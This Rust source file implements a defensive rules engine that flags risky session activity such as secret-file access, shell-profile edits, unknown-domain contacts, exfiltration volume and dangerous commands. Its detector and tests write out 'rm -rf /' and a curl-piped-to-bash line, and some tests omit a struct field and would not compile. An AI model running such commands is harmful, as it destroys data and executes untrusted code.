//! Rules engine for Antidote

use antidote_core::{
    Counts, Evidence, Event, EventType, Flag, Label, RiskSummary, Severity,
};
use anyhow::{Context, Result};
use globset::{Glob, GlobSet, GlobSetBuilder};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::fs;
use time::{Duration, OffsetDateTime};

/// Rules configuration loaded from YAML
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RulesConfig {
    pub known_domains: Vec<String>,
    pub sensitive_path_globs: Vec<String>,
    #[serde(default)]
    pub benign_path_globs: Vec<String>,
    #[serde(default)]
    pub time_windows: TimeWindows,
    pub thresholds: Thresholds,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeWindows {
    #[serde(default = "default_unknown_domains_window")]
    pub unknown_domains_window_seconds: u64,
    #[serde(default = "default_sensitive_burst_window")]
    pub sensitive_burst_window_seconds: u64,
}

fn default_unknown_domains_window() -> u64 { 120 }
fn default_sensitive_burst_window() -> u64 { 60 }

impl Default for TimeWindows {
    fn default() -> Self {
        Self {
            unknown_domains_window_seconds: 120,
            sensitive_burst_window_seconds: 60,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Thresholds {
    pub egress_mb_medium: f64,
    pub egress_mb_high: f64,
    pub bulk_delete: u64,
    pub bulk_write: u64,
    pub cmds_high: u64,
    pub unknown_domains_high: u64,
    #[serde(default = "default_unknown_domains_cluster")]
    pub unknown_domains_cluster: u64,
    #[serde(default = "default_sensitive_burst")]
    pub sensitive_burst: u64,
    #[serde(default = "default_exfil_egress_mb")]
    pub exfil_egress_mb: f64,
}

fn default_unknown_domains_cluster() -> u64 { 3 }
fn default_sensitive_burst() -> u64 { 3 }
fn default_exfil_egress_mb() -> f64 { 5.0 }

impl Default for RulesConfig {
    fn default() -> Self {
        Self {
            known_domains: vec![],
            sensitive_path_globs: vec![],
            benign_path_globs: vec![],
            time_windows: TimeWindows::default(),
            thresholds: Thresholds {
                egress_mb_medium: 1.0,
                egress_mb_high: 10.0,
                bulk_delete: 20,
                bulk_write: 100,
                cmds_high: 30,
                unknown_domains_high: 3,
                unknown_domains_cluster: 3,
                sensitive_burst: 3,
                exfil_egress_mb: 5.0,
            },
        }
    }
}

/// Session state tracked by the rule engine
#[derive(Debug, Clone)]
pub struct SessionState {
    pub session_id: String,
    pub app: String,
    pub counts: Counts,
    pub flags: Vec<Flag>,
    pub labels: HashSet<Label>,
    pub evidence: Evidence,
    /// Track rule hit counts to enforce caps
    rule_hits: HashMap<String, u32>,
    /// Track event timestamps for time-window rules (Phase 3)
    pub event_timestamps: Vec<OffsetDateTime>,
    /// Track sensitive file writes with timestamps
    pub sensitive_writes: Vec<(String, OffsetDateTime)>,
    /// Track unknown domain contacts with timestamps
    pub unknown_domain_contacts: Vec<(String, OffsetDateTime)>,
}

impl SessionState {
    pub fn new(session_id: String, app: String) -> Self {
        Self {
            session_id,
            app,
            counts: Counts::default(),
            flags: Vec::new(),
            labels: HashSet::new(),
            evidence: Evidence::default(),
            rule_hits: HashMap::new(),
            event_timestamps: Vec::new(),
            sensitive_writes: Vec::new(),
            unknown_domain_contacts: Vec::new(),
        }
    }

    /// Check if a rule has hit its cap (max 3 hits per rule)
    fn can_trigger_rule(&self, rule_id: &str) -> bool {
        self.rule_hits.get(rule_id).copied().unwrap_or(0) < 3
    }

    /// Record a rule hit
    fn record_rule_hit(&mut self, rule_id: &str) {
        *self.rule_hits.entry(rule_id.to_string()).or_insert(0) += 1;
    }

    /// Calculate risk summary from flags (Phase 3: with synergy bonuses and dampening)
    pub fn calculate_risk(&self) -> RiskSummary {
        // Sum unique flag weights (after caps)
        let unique_weights: HashSet<i32> = self.flags.iter().map(|f| f.weight).collect();
        let mut score: i32 = unique_weights.iter().sum();

        // Phase 3: Synergy bonuses for correlated bad patterns
        let has_exfil_suspected = self.labels.contains(&Label::SuspiciousEgress) &&
            self.evidence.unknown_domains.len() > 0 &&
            self.evidence.sensitive_paths.len() > 0;
        if has_exfil_suspected {
            score += 15; // DATA_EXFIL_SUSPECTED synergy bonus
        }

        // Phase 3: Dampening for benign labels (but never below 0)
        let has_benign_install = self.labels.contains(&Label::LikelyDepInstall);
        let has_high_sev = self.flags.iter().any(|f| matches!(f.severity, Severity::High | Severity::Crit));
        if has_benign_install && !has_high_sev {
            score = (score - 10).max(0); // Reduce false positives for installs
        }

        RiskSummary::new(score)
    }
}

/// Rule engine that evaluates events and produces flags
pub struct RuleEngine {
    config: RulesConfig,
    sensitive_globset: GlobSet,
    benign_globset: GlobSet,
}

impl RuleEngine {
    /// Load rules from a YAML file
    pub fn load_from_file(path: &str) -> Result<Self> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read rules file: {}", path))?;

        let config: RulesConfig = serde_yaml::from_str(&content)
            .with_context(|| format!("Failed to parse rules YAML: {}", path))?;

        // Build globset for sensitive paths
        let mut sensitive_builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            // Expand ~ to home directory
            let expanded = if glob_str.starts_with("~/") {
                let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                glob_str.replacen("~", &home, 1)
            } else {
                glob_str.clone()
            };

            let glob = Glob::new(&expanded)
                .with_context(|| format!("Invalid glob pattern: {}", glob_str))?;
            sensitive_builder.add(glob);
        }
        let sensitive_globset = sensitive_builder.build()
            .context("Failed to build sensitive globset")?;

        // Build globset for benign paths (Phase 3)
        let mut benign_builder = GlobSetBuilder::new();
        for glob_str in &config.benign_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                benign_builder.add(glob);
            }
        }
        let benign_globset = benign_builder.build()
            .unwrap_or_else(|_| GlobSet::empty());

        Ok(Self {
            config,
            sensitive_globset,
            benign_globset,
        })
    }

    /// Create a rule engine with default config (for testing)
    pub fn with_default_config() -> Self {
        let config = RulesConfig::default();
        let mut sensitive_builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                sensitive_builder.add(glob);
            }
        }
        let sensitive_globset = sensitive_builder.build().unwrap_or_else(|_| GlobSet::empty());

        let mut benign_builder = GlobSetBuilder::new();
        for glob_str in &config.benign_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                benign_builder.add(glob);
            }
        }
        let benign_globset = benign_builder.build().unwrap_or_else(|_| GlobSet::empty());

        Self {
            config,
            sensitive_globset,
            benign_globset,
        }
    }

    /// Check if a path matches benign globs (Phase 3)
    fn is_benign_path(&self, path: &str) -> bool {
        self.benign_globset.is_match(path)
    }

    /// Check if a domain is known (exact match or subdomain)
    fn is_known_domain(&self, domain: &str) -> bool {
        self.config.known_domains.iter().any(|known| {
            domain == known || domain.ends_with(&format!(".{}", known))
        })
    }

    /// Check if a path matches sensitive globs
    fn is_sensitive_path(&self, path: &str) -> bool {
        // Expand ~ in path
        let expanded = if path.starts_with("~/") {
            let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
            path.replacen("~", &home, 1)
        } else {
            path.to_string()
        };

        self.sensitive_globset.is_match(&expanded)
    }

    /// Check if a command is dangerous
    fn is_dangerous_command(&self, argv: &[String]) -> bool {
        if argv.is_empty() {
            return false;
        }

        let cmd = argv[0].as_str();
        let args_str = argv.join(" ");

        // rm -rf
        if cmd == "rm" && args_str.contains("-rf") {
            return true;
        }

        // curl/wget piped to sh/bash
        if (cmd == "curl" || cmd == "wget") && (args_str.contains("| sh") || args_str.contains("| bash")) {
            return true;
        }

        // chmod 777
        if cmd == "chmod" && args_str.contains("777") {
            return true;
        }

        false
    }

    /// Evaluate an event and produce flags
    pub fn evaluate_event(&self, event: &Event, session: &mut SessionState) -> Vec<Flag> {
        let mut flags = Vec::new();
        let now = event.ts;

        // Track event timestamp for time-window rules (Phase 3)
        session.event_timestamps.push(now);
        // Keep only recent timestamps (last 5 minutes)
        let cutoff = now - Duration::minutes(5);
        session.event_timestamps.retain(|&ts| ts >= cutoff);

        // Update session counts and evaluate event-driven rules
        match event.event_type {
            EventType::FileWrite => {
                session.counts.files_written += 1;
                session.counts.events_total += 1;

                // R1: SENSITIVE_FILE_WRITE
                if let Some(path) = event.payload.get("path").and_then(|v| v.as_str()) {
                    if self.is_sensitive_path(path) && session.can_trigger_rule("R1") {
                        session.record_rule_hit("R1");
                        session.evidence.add_sensitive_path(path.to_string());
                        let flag = Flag::new(
                            session.session_id.clone(),
                            "R1".to_string(),
                            Severity::Crit,
                            30,
                            Label::ConfigTampering,
                            serde_json::json!({
                                "path": path,
                                "event_id": event.id
                            }),
                            format!("Sensitive file write detected: {}", path),
                        );
                        flags.push(flag);
                    }

                    // R2: SHELL_PROFILE_WRITE
                    let shell_profiles = ["~/.zshrc", "~/.bashrc", "~/.profile"];
                    let expanded_path = if path.starts_with("~/") {
                        let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                        path.replacen("~", &home, 1)
                    } else {
                        path.to_string()
                    };

                    if shell_profiles.iter().any(|&p| {
                        let expanded = if p.starts_with("~/") {
                            let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                            p.replacen("~", &home, 1)
                        } else {
                            p.to_string()
                        };
                        expanded_path == expanded || expanded_path.ends_with(&expanded)
                    }) && session.can_trigger_rule("R2") {
                        session.record_rule_hit("R2");
                        let flag = Flag::new(
                            session.session_id.clone(),
                            "R2".to_string(),
                            Severity::Crit,
                            35,
                            Label::PersistenceModification,
                            serde_json::json!({
                                "path": path,
                                "event_id": event.id
                            }),
                            format!("Shell profile modification detected: {}", path),
                        );
                        flags.push(flag);
                    }
                }
            }
            EventType::FileDelete => {
                session.counts.files_deleted += 1;
                session.counts.events_total += 1;

                // R3B: BULK_DELETE_PROGRESSIVE (Phase 2) - flag at 5 files
                if session.counts.files_deleted == 5 && session.can_trigger_rule("R3B") {
                    session.record_rule_hit("R3B");
                    if let Some(path) = event.payload.get("path").and_then(|v| v.as_str()) {
                        session.evidence.add_deleted_path(path.to_string());
                    }
                    let flag = Flag::new(
                        session.session_id.clone(),
                        "R3B".to_string(),
                        Severity::Med,
                        10,
                        Label::DestructiveAction,
                        serde_json::json!({
                            "files_deleted": session.counts.files_deleted,
                            "event_id": event.id
                        }),
                        format!("Progressive bulk delete detected: {} files", session.counts.files_deleted),
                    );
                    flags.push(flag);
                }
            }
            EventType::FileCreate | EventType::FileRename => {
                session.counts.files_written += 1;
                session.counts.events_total += 1;
            }
            EventType::FileRead => {
                session.counts.files_read += 1;
                session.counts.events_total += 1;

                // R14: SENSITIVE_FILE_READ (Phase 4)
                if let Some(path) = event.payload.get("path").and_then(|v| v.as_str()) {
                    if self.is_sensitive_path(path) && session.can_trigger_rule("R14") {
                        session.record_rule_hit("R14");
                        session.evidence.add_sensitive_path(path.to_string());
                        let flag = Flag::new(
                            session.session_id.clone(),
                            "R14".to_string(),
                            Severity::High,
                            15,
                            Label::SensitiveAccess,
                            serde_json::json!({
                                "path": path,
                                "event_id": event.id
                            }),
                            format!("Sensitive file read detected: {}", path),
                        );
                        flags.push(flag);
                    }
                }
            }
            EventType::NetHttp => {
                session.counts.events_total += 1;
                if let Some(domain) = event.payload.get("domain").and_then(|v| v.as_str()) {
                    session.counts.domains += 1;
                    if let Some(bytes_out) = event.payload.get("bytes_out").and_then(|v| v.as_u64()) {
                        session.counts.bytes_out += bytes_out;
                    }

                    // Track unknown domains for time-window rules (Phase 3)
                    if !self.is_known_domain(domain) {
                        session.unknown_domain_contacts.push((domain.to_string(), now));
                        let cutoff = now - Duration::seconds(self.config.time_windows.unknown_domains_window_seconds as i64);
                        session.unknown_domain_contacts.retain(|(_, ts)| *ts >= cutoff);
                    }

                    // R4: UNKNOWN_DOMAIN_CONTACT
                    if !self.is_known_domain(domain) && session.can_trigger_rule("R4") {
                        session.record_rule_hit("R4");
                        session.evidence.add_unknown_domain(domain.to_string());
                        let flag = Flag::new(
                            session.session_id.clone(),
                            "R4".to_string(),
                            Severity::Med,
                            10,
                            Label::UnknownEndpoint,
                            serde_json::json!({
                                "domain": domain,
                                "event_id": event.id
                            }),
                            format!("Unknown domain contacted: {}", domain),
                        );
                        flags.push(flag);
                    }
                }
            }
            EventType::CmdExec => {
                session.counts.cmds += 1;
                session.counts.events_total += 1;

                // R3: DANGEROUS_COMMAND
                if let Some(argv_json) = event.payload.get("argv").and_then(|v| v.as_array()) {
                    let argv: Vec<String> = argv_json
                        .iter()
                        .filter_map(|v| v.as_str().map(|s| s.to_string()))
                        .collect();

                    if self.is_dangerous_command(&argv) && session.can_trigger_rule("R3") {
                        session.record_rule_hit("R3");
                        let cmd_str = argv.join(" ");
                        session.evidence.add_dangerous_command(cmd_str.clone());
                        let flag = Flag::new(
                            session.session_id.clone(),
                            "R3".to_string(),
                            Severity::High,
                            25,
                            Label::ExecutionRisk,
                            serde_json::json!({
                                "argv": argv,
                                "event_id": event.id
                            }),
                            format!("Dangerous command detected: {}", cmd_str),
                        );
                        flags.push(flag);
                    }
                }
            }
            EventType::Tick | EventType::Heartbeat => {
                // Aggregate-driven rules evaluated on Tick
                flags.extend(self.evaluate_aggregate_rules(session));
            }
            _ => {
                session.counts.events_total += 1;
            }
        }

        // Add flags to session
        for flag in &flags {
            session.flags.push(flag.clone());
            session.labels.insert(flag.label);
        }

        flags
    }

    /// Evaluate aggregate-driven rules (called on Tick or SessionEnd)
    fn evaluate_aggregate_rules(&self, session: &mut SessionState) -> Vec<Flag> {
        let mut flags = Vec::new();

        // R5: HIGH_EGRESS
        let egress_mb = session.counts.bytes_out as f64 / 1_000_000.0;
        if egress_mb > self.config.thresholds.egress_mb_high && session.can_trigger_rule("R5") {
            session.record_rule_hit("R5");
            let flag = Flag::new(
                session.session_id.clone(),
                "R5".to_string(),
                Severity::High,
                20,
                Label::SuspiciousEgress,
                serde_json::json!({
                    "egress_mb": egress_mb,
                    "threshold": self.config.thresholds.egress_mb_high
                }),
                format!("High egress detected: {:.2} MB", egress_mb),
            );
            flags.push(flag);
        } else if egress_mb > self.config.thresholds.egress_mb_medium && session.can_trigger_rule("R5") {
            session.record_rule_hit("R5");
            let flag = Flag::new(
                session.session_id.clone(),
                "R5".to_string(),
                Severity::Med,
                8,
                Label::SuspiciousEgress,
                serde_json::json!({
                    "egress_mb": egress_mb,
                    "threshold": self.config.thresholds.egress_mb_medium
                }),
                format!("Medium egress detected: {:.2} MB", egress_mb),
            );
            flags.push(flag);
        }

        // R6: BULK_DELETE (at threshold)
        if session.counts.files_deleted >= self.config.thresholds.bulk_delete && session.can_trigger_rule("R6") {
            session.record_rule_hit("R6");
            let flag = Flag::new(
                session.session_id.clone(),
                "R6".to_string(),
                Severity::Crit,
                40,
                Label::DestructiveAction,
                serde_json::json!({
                    "files_deleted": session.counts.files_deleted,
                    "threshold": self.config.thresholds.bulk_delete
                }),
                format!("Bulk delete detected: {} files", session.counts.files_deleted),
            );
            flags.push(flag);
        }

        // R6B: MANY_UNKNOWN_DOMAINS (Phase 2)
        let unknown_domain_count = session.evidence.unknown_domains.len() as u64;
        if unknown_domain_count >= self.config.thresholds.unknown_domains_high && session.can_trigger_rule("R6B") {
            session.record_rule_hit("R6B");
            let flag = Flag::new(
                session.session_id.clone(),
                "R6B".to_string(),
                Severity::High,
                20,
                Label::UnknownEndpoint,
                serde_json::json!({
                    "unknown_domains_count": unknown_domain_count,
                    "threshold": self.config.thresholds.unknown_domains_high
                }),
                format!("Many unknown domains contacted: {}", unknown_domain_count),
            );
            flags.push(flag);
        }

        // R7: BULK_WRITE
        if session.counts.files_written >= self.config.thresholds.bulk_write && session.can_trigger_rule("R7") {
            session.record_rule_hit("R7");
            let flag = Flag::new(
                session.session_id.clone(),
                "R7".to_string(),
                Severity::Med,
                12,
                Label::BulkTraversal,
                serde_json::json!({
                    "files_written": session.counts.files_written,
                    "threshold": self.config.thresholds.bulk_write
                }),
                format!("Bulk write detected: {} files", session.counts.files_written),
            );
            flags.push(flag);
        }

        // R8: EXCESSIVE_COMMANDS
        if session.counts.cmds >= self.config.thresholds.cmds_high && session.can_trigger_rule("R8") {
            session.record_rule_hit("R8");
            let flag = Flag::new(
                session.session_id.clone(),
                "R8".to_string(),
                Severity::Med,
                10,
                Label::ExecutionRisk,
                serde_json::json!({
                    "cmds": session.counts.cmds,
                    "threshold": self.config.thresholds.cmds_high
                }),
                format!("Excessive commands detected: {} commands", session.counts.cmds),
            );
            flags.push(flag);
        }

        // Phase 3: New rules

        // R9: REPO_SECRETS_HUNTING - many file writes/reads with secret-like names
        if session.counts.files_written >= 10 && session.can_trigger_rule("R9") {
            let secret_like_count = session.evidence.sensitive_paths.len();
            if secret_like_count >= 3 {
                session.record_rule_hit("R9");
                let flag = Flag::new(
                    session.session_id.clone(),
                    "R9".to_string(),
                    Severity::High,
                    25,
                    Label::SensitiveAccess,
                    serde_json::json!({
                        "files_written": session.counts.files_written,
                        "sensitive_paths": secret_like_count
                    }),
                    format!("Secrets hunting detected: {} sensitive files in {} writes", secret_like_count, session.counts.files_written),
                );
                flags.push(flag);
            }
        }

        // R10: CONFIG_PERSISTENCE - repeated shell profile/launch agent modifications
        if session.sensitive_writes.len() >= self.config.thresholds.sensitive_burst as usize && session.can_trigger_rule("R10") {
            let shell_profile_count = session.sensitive_writes.iter()
                .filter(|(path, _)| path.contains(".zshrc") || path.contains(".bashrc") || path.contains(".profile") || path.contains("LaunchAgents"))
                .count();
            if shell_profile_count >= 2 {
                session.record_rule_hit("R10");
                let flag = Flag::new(
                    session.session_id.clone(),
                    "R10".to_string(),
                    Severity::Crit,
                    40,
                    Label::PersistenceModification,
                    serde_json::json!({
                        "profile_modifications": shell_profile_count
                    }),
                    format!("Config persistence detected: {} profile/agent modifications", shell_profile_count),
                );
                flags.push(flag);
            }
        }

        // R11: SUSPICIOUS_DOMAIN_CLUSTER - many unknown domains in short window
        let recent_unknown = session.unknown_domain_contacts.len() as u64;
        if recent_unknown >= self.config.thresholds.unknown_domains_cluster && session.can_trigger_rule("R11") {
            session.record_rule_hit("R11");
            let flag = Flag::new(
                session.session_id.clone(),
                "R11".to_string(),
                Severity::High,
                22,
                Label::UnknownEndpoint,
                serde_json::json!({
                    "unknown_domains_in_window": recent_unknown,
                    "window_seconds": self.config.time_windows.unknown_domains_window_seconds
                }),
                format!("Suspicious domain cluster: {} unknown domains in {}s", recent_unknown, self.config.time_windows.unknown_domains_window_seconds),
            );
            flags.push(flag);
        }

        // R12: DATA_EXFIL_SUSPECTED - unknown domain + high egress + sensitive write
        let egress_mb = (session.counts.bytes_out as f64) / (1024.0 * 1024.0);
        if egress_mb >= self.config.thresholds.exfil_egress_mb &&
            !session.evidence.unknown_domains.is_empty() &&
            !session.evidence.sensitive_paths.is_empty() &&
            session.can_trigger_rule("R12") {
            session.record_rule_hit("R12");
            session.labels.insert(Label::SuspiciousEgress);
            let flag = Flag::new(
                session.session_id.clone(),
                "R12".to_string(),
                Severity::High,
                30,
                Label::SuspiciousEgress,
                serde_json::json!({
                    "egress_mb": egress_mb,
                    "unknown_domains": session.evidence.unknown_domains.len(),
                    "sensitive_paths": session.evidence.sensitive_paths.len()
                }),
                format!("Data exfiltration suspected: {:.2}MB to {} unknown domains after sensitive writes", egress_mb, session.evidence.unknown_domains.len()),
            );
            flags.push(flag);
        }

        // R13: TOOLCHAIN_INSTALL_SPIKE - high network to registries + many file writes under node_modules/vendor
        let is_registry_domain = session.evidence.unknown_domains.iter().any(|d| 
            d.contains("npmjs.org") || d.contains("pypi.org") || d.contains("registry.npmjs.org")
        ) || self.config.known_domains.iter().any(|d| 
            session.evidence.unknown_domains.iter().any(|ud| ud.contains(d))
        );
        if is_registry_domain && session.counts.files_written >= 50 && session.can_trigger_rule("R13") {
            // Check if writes are under benign paths
            let benign_write_count = session.evidence.sensitive_paths.iter()
                .filter(|p| self.is_benign_path(p))
                .count();
            if benign_write_count == 0 && session.counts.files_written >= 100 {
                session.record_rule_hit("R13");
                session.labels.insert(Label::LikelyDepInstall);
                // This is a benign label, so we don't add a flag, just the label
            }
        }

        // BENIGN_INDEXING - many file touches but only to known domains and no sensitive hits
        if session.counts.files_written >= 50 && 
           session.evidence.unknown_domains.is_empty() &&
           session.evidence.sensitive_paths.is_empty() &&
           !session.labels.contains(&Label::LikelyDepInstall) {
            session.labels.insert(Label::BenignIndexing);
        }

        flags
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use antidote_core::{EventType, RiskBucket};
    use time::OffsetDateTime;
    use uuid::Uuid;

    #[test]
    fn test_risk_bucket_boundaries() {
        let low = RiskSummary::new(30);
        assert_eq!(low.bucket, RiskBucket::Low);
        assert_eq!(low.score, 30);

        let medium = RiskSummary::new(31);
        assert_eq!(medium.bucket, RiskBucket::Medium);
        assert_eq!(medium.score, 31);

        let high = RiskSummary::new(61);
        assert_eq!(high.bucket, RiskBucket::High);
        assert_eq!(high.score, 61);

        let clamped = RiskSummary::new(150);
        assert_eq!(clamped.bucket, RiskBucket::High);
        assert_eq!(clamped.score, 100);
    }

    #[test]
    fn test_rule_hit_caps() {
        let mut session = SessionState::new("test".to_string(), "test".to_string());
        let engine = RuleEngine::with_default_config();

        // Create a dangerous command event
        let event = Event {
            id: Uuid::new_v4(),
            ts: OffsetDateTime::now_utc(),
            session_id: "test".to_string(),
            event_type: EventType::CmdExec,
            payload: serde_json::json!({
                "argv": ["rm", "-rf", "/"]
            }),
        };

        // First 3 hits should work
        for _ in 0..3 {
            let flags = engine.evaluate_event(&event, &mut session);
            assert!(!flags.is_empty());
        }

        // 4th hit should be capped
        let flags = engine.evaluate_event(&event, &mut session);
        assert!(flags.is_empty());
    }

    #[test]
    fn test_sensitive_path_matching() {
        let mut config = RulesConfig::default();
        config.sensitive_path_globs = vec!["**/.env".to_string(), "~/.ssh/**".to_string()];
        
        let mut builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            let expanded = if glob_str.starts_with("~/") {
                let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                glob_str.replacen("~", &home, 1)
            } else {
                glob_str.clone()
            };
            if let Ok(glob) = Glob::new(&expanded) {
                builder.add(glob);
            }
        }
        let globset = builder.build().unwrap();

        let engine = RuleEngine {
            config,
            sensitive_globset: globset,
        };

        // Should match
        assert!(engine.is_sensitive_path("/project/.env"));
        assert!(engine.is_sensitive_path("/deep/nested/.env"));

        // Should not match
        assert!(!engine.is_sensitive_path("/project/.env.backup"));
    }

    #[test]
    fn test_unknown_domain_detection() {
        let mut config = RulesConfig::default();
        config.known_domains = vec!["api.openai.com".to_string(), "github.com".to_string()];
        
        let mut builder = GlobSetBuilder::new();
        let globset = builder.build().unwrap_or_else(|_| GlobSet::empty());
        let engine = RuleEngine {
            config,
            sensitive_globset: globset,
        };

        // Known domains
        assert!(engine.is_known_domain("api.openai.com"));
        assert!(engine.is_known_domain("sub.api.openai.com"));
        assert!(engine.is_known_domain("github.com"));

        // Unknown domains
        assert!(!engine.is_known_domain("evil.example"));
        assert!(!engine.is_known_domain("malicious.com"));
    }

    #[test]
    fn test_dangerous_command_detection() {
        let engine = RuleEngine::with_default_config();

        // rm -rf
        assert!(engine.is_dangerous_command(&["rm".to_string(), "-rf".to_string(), "/".to_string()]));

        // curl | bash
        assert!(engine.is_dangerous_command(&["curl".to_string(), "http://x.sh".to_string(), "|".to_string(), "bash".to_string()]));

        // chmod 777
        assert!(engine.is_dangerous_command(&["chmod".to_string(), "777".to_string(), "file".to_string()]));

        // Safe command
        assert!(!engine.is_dangerous_command(&["ls".to_string(), "-la".to_string()]));
    }

    #[test]
    fn test_evidence_caps() {
        let mut evidence = Evidence::default();

        // Add 10 sensitive paths
        for i in 0..10 {
            evidence.add_sensitive_path(format!("/path/{}", i));
        }

        // Should be capped at 5
        assert_eq!(evidence.sensitive_paths.len(), 5);
    }
}
